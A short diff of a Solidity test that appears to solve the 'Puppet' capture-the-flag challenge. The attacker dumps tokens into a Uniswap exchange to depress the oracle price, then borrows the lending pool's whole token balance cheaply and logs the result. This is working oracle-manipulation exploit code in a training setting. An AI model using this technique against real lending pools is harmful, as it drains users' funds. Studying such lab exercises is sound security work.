@@ -107,9 +107,11 @@ contract Puppet is Test {
         uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), ethOut, 
             block.timestamp + 1 hours);
 
-        uint256 depositReq = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        uint256 borrowAmount = dvt.balanceOf(address(puppetPool));
 
-        puppetPool.borrow{value: depositReq}(POOL_INITIAL_TOKEN_BALANCE);
+        puppetPool.borrow{value: attacker.balance}(borrowAmount);
+        console2.log("pool balance %s vs attack balance %s", 
+            dvt.balanceOf(address(puppetPool)), dvt.balanceOf(attacker));        
         vm.stopPrank();
         /**
          * EXPLOIT END *
